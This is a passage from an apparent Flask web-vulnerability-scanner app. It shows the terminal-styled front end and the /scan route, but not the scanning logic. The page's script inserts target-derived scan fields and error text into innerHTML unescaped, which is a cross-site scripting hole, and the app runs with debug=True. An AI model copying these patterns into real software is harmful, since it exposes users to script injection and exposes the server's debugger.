                text-shadow: 0 0 5px #00ff00;
            }
            .input-group label {
                color: #00ff00;
                margin-bottom: 0.5rem;
                font-size: 0.9rem;
            }
            .terminal-input {
                background-color: #000;
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 0.75rem 1rem;
                border-radius: 4px;
                font-family: 'Roboto Mono', monospace;
                font-size: 1rem;
                outline: none;
                box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
            }
            .terminal-input::placeholder {
                color: #008800; /* Lighter green for placeholder */
            }
            .scan-button {
                background-image: linear-gradient(to right, #008800 0%, #00cc00 100%); /* Green gradient */
                transition: all 0.3s ease;
                color: #0a0a0a; /* Dark text on button */
                font-weight: bold;
                border: none;
                padding: 0.75rem 1.5rem;
                border-radius: 4px;
                cursor: pointer;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            }
            .scan-button:hover {
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
                transform: translateY(-2px);
            }
            .loading-indicator {
                color: #00cc00; /* Bright green */
                font-size: 1rem;
                margin-top: 1.5rem;
            }
            .results-title {
                color: #00ff00;
                font-size: 1.8rem;
                font-weight: bold;
                margin-top: 2rem;
                margin-bottom: 1rem;
                text-shadow: 0 0 5px #00ff00;
            }
            .result-card {
                background-color: #2a2a2a; /* Darker card background */
                border-left-width: 4px;
                border-color: #00ff00; /* Default green border */
                padding: 1rem;
                border-radius: 4px;
                margin-bottom: 1rem;
                color: #eee; /* Light text for readability */
                font-size: 0.9rem;
            }
            .result-card h3 {
                color: #00ffff; /* Cyan for vulnerability type */
                font-weight: bold;
                margin-bottom: 0.5rem;
            }
            .result-card strong {
                color: #00ff00; /* Green for labels */
            }
            .result-card a {
                color: #00aaff; /* Blue for links */
                text-decoration: underline;
            }
            .result-card code {
                background-color: #000;
                color: #ffaa00; /* Orange for payloads */
                padding: 0.2rem 0.4rem;
                border-radius: 3px;
                font-size: 0.8rem;
            }
            .result-card pre {
                background-color: #000;
                color: #fff; /* White for evidence content */
                padding: 0.5rem;
                border-radius: 4px;
                overflow-x: auto;
                max-height: 10rem;
                margin-top: 0.5rem;
                border: 1px dashed #008800; /* Dashed green border */
            }
            .result-card details summary {
                color: #00ccff; /* Light blue for summary */
                cursor: pointer;
            }

            /* Severity specific colors for result cards */
            .severity-critical { border-color: #ff0000; } /* Red */
            .severity-high { border-color: #ff8800; } /* Orange */
            .severity-medium { border-color: #ffff00; } /* Yellow */
            .severity-low { border-color: #00aaff; } /* Light Blue */
            .severity-info { border-color: #888888; } /* Gray */

            /* Text colors for severity spans */
            .text-critical { color: #ff0000; }
            .text-high { color: #ff8800; }
            .text-medium { color: #ffff00; }
            .text-low { color: #00aaff; }
            .text-info { color: #888888; }

            /* Red Alert specific styles */
            .alert-danger {
                background-color: #330000; /* Dark red background */
                color: #ff0000; /* Bright red text */
                border: 1px solid #ff0000; /* Red border */
                box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); /* Red glow */
                font-size: 1.2rem;
                padding: 1rem;
                border-radius: 4px;
            }
            .no-results-message {
                color: #00cc00; /* Green for no results */
                font-style: italic;
            }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen p-4">
        <div class="terminal-container w-full">
            <h1 class="terminal-header">CYBER SCANNER v1.0</h1>

            <div class="input-group mb-6">
                <label for="targetUrl" class="block">Target URL:</label>
                <input type="url" id="targetUrl" class="terminal-input w-full" placeholder="https://vulnerable.example.com" required>
            </div>

            <button id="scanButton" class="scan-button w-full">
                INITIATE SCAN
            </button>

            <div id="loadingIndicator" class="hidden loading-indicator text-center mt-6">
                [SCANNER]: Initiating scan... Please wait.
            </div>

            <!-- Red Alert Section -->
            <div id="vulnerabilityAlert" class="hidden alert-danger p-4 mt-6 text-center">
                [ALERT]: CRITICAL VULNERABILITIES DETECTED! REVIEW LOGS BELOW.
            </div>

            <h2 class="results-title mt-8">SCAN LOGS:</h2>
            <div id="resultsContainer" class="space-y-4">
                <p class="no-results-message text-center" id="noResultsMessage">[SCANNER]: No scan results yet. Enter a URL and click 'INITIATE SCAN'.</p>
            </div>
        </div>

        <script>
            document.getElementById('scanButton').addEventListener('click', async () => {
                const targetUrl = document.getElementById('targetUrl').value;
                const resultsContainer = document.getElementById('resultsContainer');
                const loadingIndicator = document.getElementById('loadingIndicator');
                const noResultsMessage = document.getElementById('noResultsMessage');
                const vulnerabilityAlert = document.getElementById('vulnerabilityAlert');

                if (!targetUrl) {
                    // Using a custom message for CLI feel instead of browser alert
                    resultsContainer.innerHTML = '<p class="text-red-500">[ERROR]: Target URL is required. Aborting scan.</p>';
                    noResultsMessage.classList.add('hidden');
                    return;
                }

                resultsContainer.innerHTML = ''; // Clear previous results
                noResultsMessage.classList.add('hidden'); // Hide "No results" message
                vulnerabilityAlert.classList.add('hidden'); // Hide the alert at the start of a new scan
                loadingIndicator.classList.remove('hidden'); // Show loading indicator
                document.getElementById('scanButton').disabled = true; // Disable button during scan
                document.getElementById('scanButton').textContent = 'SCANNING...';


                try {
                    const response = await fetch('/scan', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ url: targetUrl }),
                    });

                    if (!response.ok) {
                        const errorText = await response.text();
                        throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
                    }

                    const vulnerabilities = await response.json();

                    loadingIndicator.classList.add('hidden'); // Hide loading indicator
                    document.getElementById('scanButton').disabled = false; // Re-enable button
                    document.getElementById('scanButton').textContent = 'INITIATE SCAN';


                    if (vulnerabilities.length === 0) {
                        resultsContainer.innerHTML = '<p class="text-green-500">[SCANNER]: No vulnerabilities found on target.</p>';
                        noResultsMessage.classList.remove('hidden'); // Ensure "No results" message is visible
                    } else {
                        vulnerabilities.forEach(vuln => {
                            const card = document.createElement('div');
                            card.className = `result-card ${getSeverityClass(vuln.severity)}`;
                            card.innerHTML = `
                                <h3>[VULN]: ${vuln.type}</h3>
                                <p><strong>URL:</strong> <a href="${vuln.url}" target="_blank">${vuln.url}</a></p>
                                <p><strong>Method:</strong> ${vuln.method}</p>
                                <p><strong>Input:</strong> ${vuln.input}</p>
                                <p><strong>Payload:</strong> <code>${escapeHtml(vuln.payload)}</code></p>
                                <p><strong>Severity:</strong> <span class="font-medium ${getTextColorClass(vuln.severity)}">${vuln.severity}</span></p>
                                <details class="mt-2">
                                    <summary>[EVIDENCE] Click to view</summary>
                                    <pre>${escapeHtml(vuln.evidence)}</pre>
                                </details>
                            `;
                            resultsContainer.appendChild(card);
                        });
                        vulnerabilityAlert.classList.remove('hidden'); // Show the red alert if vulnerabilities are found
                    }
                } catch (error) {
                    console.error('Scan failed:', error);
                    loadingIndicator.classList.add('hidden');
                    document.getElementById('scanButton').disabled = false;
                    document.getElementById('scanButton').textContent = 'INITIATE SCAN';
                    resultsContainer.innerHTML = `<p class="text-red-500">[ERROR]: Scan failed: ${error.message}. Check URL and network.</p>`;
                    noResultsMessage.classList.remove('hidden'); // Show "No results" message on error
                }
            });

            function getSeverityClass(severity) {
                switch (severity) {
                    case 'Critical': return 'severity-critical';
                    case 'High': return 'severity-high';
                    case 'Medium': return 'severity-medium';
                    case 'Low': return 'severity-low';
                    case 'Informational': return 'severity-info';
                    default: return '';
                }
            }

            function getTextColorClass(severity) {
                switch (severity) {
                    case 'Critical': return 'text-critical';
                    case 'High': return 'text-high';
                    case 'Medium': return 'text-medium';
                    case 'Low': return 'text-low';
                    case 'Informational': return 'text-info';
                    default: return '';
                }
            }

            function escapeHtml(text) {
                const map = {
                    '&': '&amp;',
                    '<': '&lt;',
                    '>': '&gt;',
                    '"': '&quot;',
                    "'": '&#039;'
                };
                return text.replace(/[&<>"']/g, function(m) { return map[m]; });
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/scan', methods=['POST'])
def scan():
    """
    Endpoint to initiate a scan based on the provided URL.
    """
    data = request.get_json()
    target_url = data.get('url')

    if not target_url:
        return jsonify({"error": "URL is required"}), 400

    print(f"Starting scan for: {target_url}")
    vulnerabilities = scan_website(target_url)
    print(f"Scan finished. Found {len(vulnerabilities)} vulnerabilities.")

    return jsonify(vulnerabilities)

if __name__ == '__main__':
    # Run the Flask app
    # In a production environment, use a WSGI server like Gunicorn or uWSGI.
    app.run(debug=True, port=5000)
